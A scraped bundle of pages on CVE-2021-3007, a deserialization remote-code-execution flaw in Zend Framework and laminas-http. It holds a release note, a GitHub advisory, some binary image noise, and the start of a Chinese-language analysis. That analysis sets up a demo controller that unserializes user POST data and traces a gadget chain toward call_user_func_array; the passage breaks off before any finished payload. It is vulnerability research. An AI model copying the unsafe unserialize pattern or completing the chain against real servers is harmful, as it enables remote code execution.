[![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg)](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

* Check Point Research Publications
* Global Cyber Attack Reports
* Threat Research

February 17, 2020
### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

* Check Point Research Publications

August 11, 2017
### “The Next WannaCry” Vulnerability is Here

[![](https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg)](https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/)

* Check Point Research Publications

January 11, 2018
### ‘RubyMiner’ Cryptominer Affects 30% of WW Networks

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/CheckPointResearchLogo_white-1-e1671590634727.png)](https://research.checkpoint.com)

* Publications
  + [Global cyber attack reports](/category/threat-intelligence-reports/)
  + [Research publications](/category/threat-research/)
  + [IPS advisories](https://advisories.checkpoint.com/advisories/)
  + [Check point blog](https://blog.checkpoint.com/)
  + [Demos](/category/demos/)
* Tools
  + [Sandblast file analysis](http://threatemulation.checkpoint.com/)
  + [ThreatCloud](https://www.checkpoint.com/infinity/threatcloud/)
  + [Threat Intelligence](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  + [Zero day protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  + [Live threat map](https://threatmap.checkpoint.com/)
* [About Us](https://research.checkpoint.com/about-us/)
  + [Contact Us](https://research.checkpoint.com/contact/)

### Let’s get in touch

Subscribe for cpr blogs, news and more

[Subscribe Now](/subscription/)

© 1994-2024 Check Point Software Technologies LTD. All rights reserved.

Property of [CheckPoint.com](https://www.checkpoint.com/)

[Privacy Policy](/privacy-policy/)

![](https://research.checkpoint.com/wp-content/uploads/2022/10/popup-side-image.jpg)

## SUBSCRIBE TO CYBER INTELLIGENCE REPORTS

First Name

Last Name

Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)

Email

## We value your privacy!

BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.

ACCEPT
REJECT



=== Content from github.com_2f78b5d9_20250114_224123.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flaminas%2Flaminas-http%2Freleases%2Ftag%2F2.14.2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flaminas%2Flaminas-http%2Freleases%2Ftag%2F2.14.2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=laminas%2Flaminas-http)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[laminas](/laminas)
/
**[laminas-http](/laminas/laminas-http)**
Public

* [Notifications](/login?return_to=%2Flaminas%2Flaminas-http) You must be signed in to change notification settings
* [Fork
  30](/login?return_to=%2Flaminas%2Flaminas-http)
* [Star
   36](/login?return_to=%2Flaminas%2Flaminas-http)

* [Code](/laminas/laminas-http/tree/2.14.2)
* [Issues
  5](/laminas/laminas-http/issues)
* [Pull requests
  2](/laminas/laminas-http/pulls)
* [Actions](/laminas/laminas-http/actions)
* [Projects
  0](/laminas/laminas-http/projects)
* [Security](/laminas/laminas-http/security)
* [Insights](/laminas/laminas-http/pulse)

Additional navigation options

* [Code](/laminas/laminas-http/tree/2.14.2)
* [Issues](/laminas/laminas-http/issues)
* [Pull requests](/laminas/laminas-http/pulls)
* [Actions](/laminas/laminas-http/actions)
* [Projects](/laminas/laminas-http/projects)
* [Security](/laminas/laminas-http/security)
* [Insights](/laminas/laminas-http/pulse)

1. [Releases](/laminas/laminas-http/releases)
2. [2.14.2](/laminas/laminas-http/releases/tag/2.14.2)

# 2.14.2

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/laminas/laminas-http/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...2.14.2)

 Loading

[View all tags](/laminas/laminas-http/tags)

![@laminas-bot](https://avatars.githubusercontent.com/u/68250880?s=40&v=4)
[laminas-bot](/laminas-bot)
released this
05 Jan 16:10

·
[90 commits](/laminas/laminas-http/compare/2.14.2...2.22.x)
to 2.22.x
since this release

[2.14.2](/laminas/laminas-http/tree/2.14.2)

This tag was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/68250880?s=64&v=4)](/laminas-bot)
[laminas-bot](/laminas-bot)
Laminas Bot

GPG key ID: EE6BC8F3E070039C

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

[`298f732`](/laminas/laminas-http/commit/298f732e1acb031db70ea4fd2133a283b2a4a65e)

This commit was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/68250880?s=64&v=4)](/laminas-bot)
[laminas-bot](/laminas-bot)
Laminas Bot

GPG key ID: EE6BC8F3E070039C

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

## 2.14.2 - 2021-01-05

---

### Release Notes for [2.14.2](https://github.com/laminas/laminas-http/milestone/7)

2.14.x bugfix release (patch)

### 2.14.2

* Total issues resolved: **0**
* Total pull requests resolved: **1**
* Total contributors: **1**

#### Bug,Enhancement

* [48: Security tightening: verify a stream file name is a string before unlinking](https://github.com/laminas/laminas-http/pull/48) thanks to [@weierophinney](https://github.com/weierophinney)

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e56a0edd_20250115_200931.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-xx8f-qf9f-5fgw)

**CVE-2021-3007**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-xx8f-qf9f-5fgw)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2021-3007](/advisories/GHSA-xx8f-qf9f-5fgw)

## Remote code execution in zendframework and laminas-http

Critical severity

GitHub Reviewed

Published
Jun 8, 2021
to the GitHub Advisory Database
•
Updated Apr 22, 2024

[Vulnerability details](/advisories/GHSA-xx8f-qf9f-5fgw)
[Dependabot alerts
0](/advisories/GHSA-xx8f-qf9f-5fgw/dependabot)

## Package

composer

laminas/laminas-http
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

< 2.14.2

## Patched versions

2.14.2

composer

zendframework/zendframework
([Composer](/advisories?query=ecosystem%3Acomposer))

<= 3.0.0

None

## Description

Laminas Project laminas-http before 2.14.2, and Zend Framework 3.0.0, has a deserialization vulnerability that can lead to remote code execution if the content is controllable, related to the \_\_destruct method of the Zend\Http\Response\Stream class in Stream.php. NOTE: Zend Framework is no longer supported by the maintainer. NOTE: the laminas-http vendor considers this a "vulnerability in the PHP language itself" but has added certain type checking as a way to prevent exploitation in (unrecommended) use cases where attacker-supplied data can be deserialized.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2021-3007>
* [laminas/laminas-http#48](https://github.com/laminas/laminas-http/pull/48)
* <https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md>
* <https://github.com/laminas/laminas-http/commits/2.15.x/src/Response/Stream.php>
* <https://github.com/laminas/laminas-http/releases/tag/2.14.2>
* <https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-3007)
Jan 4, 2021

Reviewed
Apr 7, 2021

Published to the GitHub Advisory Database
Jun 8, 2021

Last updated
Apr 22, 2024

### Severity

Critical

9.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

5.359%
 (93rd percentile)

### Weaknesses

[CWE-502](/advisories?query=cwe%3A502)

### CVE ID

CVE-2021-3007

### GHSA ID

GHSA-xx8f-qf9f-5fgw

### Source code

No known source code

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-xx8f-qf9f-5fgw/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from avatars.githubusercontent.com_8b67c884_20250115_200932.html ===
���� �  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222��  ( (" ���          
   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������       
  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �;�������0\_��O!�Y��!����Uf��d�#���{�w�D�� ��}kE��H�gh�.���V����B�e�]ce5ĸU8<{sZkg�T���)�+��<1y�+�{
���>�=�]�@Q���~v��{�ktr8�Ѽ�N�U�]F�X[j{Im�pç��=j'�6��i�X���7���$��Vǃu��h^4�����\_����T��%ݕ���ݹnG��CMԥ�o���YvH���Ǩ�eM��6�+���x~mSz�y$��f�Ѐ8?�k�n`��^�3'\*��z9��]敯
NEs哷
��\���s>8��� �� ��b3��l��G
�]�k�� ;V��G�0� ����`)�9dpW������ �iME�߇����bh0s��`��K� Omvp�qo���������y� \j��� #U��r���qE6s��Ƈy,VE-����YF~��U]J�m^�L$�q�O�k����m>���?�ur��0rm�iG`�ۥ�7� ����� �Q� ��o�7��֫�WF���

=== Content from github.com_02eaacab_20250114_224119.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLing-Yizhou%2Fzendframework3-%2Fblob%2Fmain%2Fzend%2520framework3%2520%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%2520rce.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLing-Yizhou%2Fzendframework3-%2Fblob%2Fmain%2Fzend%2520framework3%2520%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%2520rce.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Ling-Yizhou%2Fzendframework3-)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Ling-Yizhou](/Ling-Yizhou)
/
**[zendframework3-](/Ling-Yizhou/zendframework3-)**
Public

* [Notifications](/login?return_to=%2FLing-Yizhou%2Fzendframework3-) You must be signed in to change notification settings
* [Fork
  11](/login?return_to=%2FLing-Yizhou%2Fzendframework3-)
* [Star
   18](/login?return_to=%2FLing-Yizhou%2Fzendframework3-)

* [Code](/Ling-Yizhou/zendframework3-)
* [Pull requests
  0](/Ling-Yizhou/zendframework3-/pulls)
* [Actions](/Ling-Yizhou/zendframework3-/actions)
* [Projects
  0](/Ling-Yizhou/zendframework3-/projects)
* [Security](/Ling-Yizhou/zendframework3-/security)
* [Insights](/Ling-Yizhou/zendframework3-/pulse)

Additional navigation options

* [Code](/Ling-Yizhou/zendframework3-)
* [Pull requests](/Ling-Yizhou/zendframework3-/pulls)
* [Actions](/Ling-Yizhou/zendframework3-/actions)
* [Projects](/Ling-Yizhou/zendframework3-/projects)
* [Security](/Ling-Yizhou/zendframework3-/security)
* [Insights](/Ling-Yizhou/zendframework3-/pulse)

## Files

 main
## Breadcrumbs

1. [zendframework3-](/Ling-Yizhou/zendframework3-/tree/main)
/
# zend framework3 反序列化 rce.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Ling-Yizhou/zendframework3-/commits/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md)241 lines (207 loc) · 7.27 KB main
## Breadcrumbs

1. [zendframework3-](/Ling-Yizhou/zendframework3-/tree/main)
/
# zend framework3 反序列化 rce.md

Top
## File metadata and controls

* Preview
* Code
* Blame

241 lines (207 loc) · 7.27 KB[Raw](https://github.com/Ling-Yizhou/zendframework3-/raw/refs/heads/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md)
# 漏洞demo

zend framework3本身没有触发反序列化的点，因此我们需要自己构造一个漏洞demo，用作poc的验证。首先用composer安装

```
composer create-project zendframework/skeleton-application

```

将`module/Application/src/Controller/IndexController.php`改成

```
class IndexController extends AbstractActionController
{
    public function indexAction()
    {
        $data = $this->getRequest()->getPost('hello');
        unserialize(base64_decode($data));
        return new ViewModel();
    }
}
```

# 漏洞分析

## \_\_destruct

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/1.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/1.png)
在zendframework3核心包中只有三个`__destruct`入口，其中两个都很简单，只有`vendor/zendframework/zend-http/src/Response/Stream.php`中的`Zend\Http\Response\Stream`类有利用的可能。其析构函数如下
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/2.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/2.png)

`$this->cleanup`和`$this->streamName`，`unlink`函数的第一个参数为`String`类型，所以可以在啊`$this->streamName`传入类的实例，可以触发`__toString`。

## \_\_toString

有`__toString`方法的类很多，我看中了`vendor/zendframework/zend-view/src/Helper/Gravatar.php`中的`Zend\View\Helper\Gravatar`
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/3.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/3.png)

跟进到`$this->htmlAttribs()`
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/4.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/4.png)

```
$key = $escaper($key);
```

看到rce的希望。回到`Gravatar`，`$this->getAttributes()`可控

```
public function getAttributes()
{
    return $this->attributes;
}
```

现在只需要构造能顺利执行到rce语句的类，但是

```
$escaper        = $this->getView()->plugin('escapehtml');
$escapeHtmlAttr = $this->getView()->plugin('escapehtmlattr');
```

这两句带来了一些麻烦。`$this->getView()`可控

```
public function getView()
{
    return $this->view;
}
```

这里可以触发`__invoke`，但是我选择直接找有`plugin()`方法的类。

## 疏通

`vendor/zendframework/zend-view/src/Renderer/PhpRenderer.php`中的`Zend\View\Renderer\PhpRenderer`就是我们要找的。
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/5.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/5.png)

由于`$this->__helpers`可控，所以`$this->getHelperPluginManager()`也可控，
接下来有两种方法，最终目的都是让`get()`返回我们要的字符串

### 方法一：Zend\ServiceManager\ReaderPluginManager

`get()`方法在`vendor/zendframework/zend-servicemanager/src/AbstractPluginManager.php`的`Zend\ServiceManager\AbstractPluginManager`中定义，这里我随便选取了子类`Zend\Config\ReaderPluginManager`

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/6.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/6.png)
`$name`参数为不可控的`escapehtml`和`escapehtmlattr`。

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/7.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/7.png)
`has()`可以控制输出使`$found`为`true`

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/8.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/8.png)
`parent::get()`同样可控

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/9.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/9.png)
`$this->validate()`主要是个`instanceof`的判断，这就限制死了`$key = $escaper($key)`中的`$escaper`必须是个类，又回到了寻找`__invoke()`。

#### \_\_invoke

`vendor/zendframework/zend-validator/src/AbstractValidator.php`中的`Zend\Validator\AbstractValidator`可以利用

```
public function __invoke($value)
{
    return $this->isValid($value);
}
```

我找到了一个可以利用的子类`Zend\Validator\Callback`

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/10.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/10.png)
可以看到第139行有`call_user_func_array`，`$callback`来自

```
public function getCallback()
{
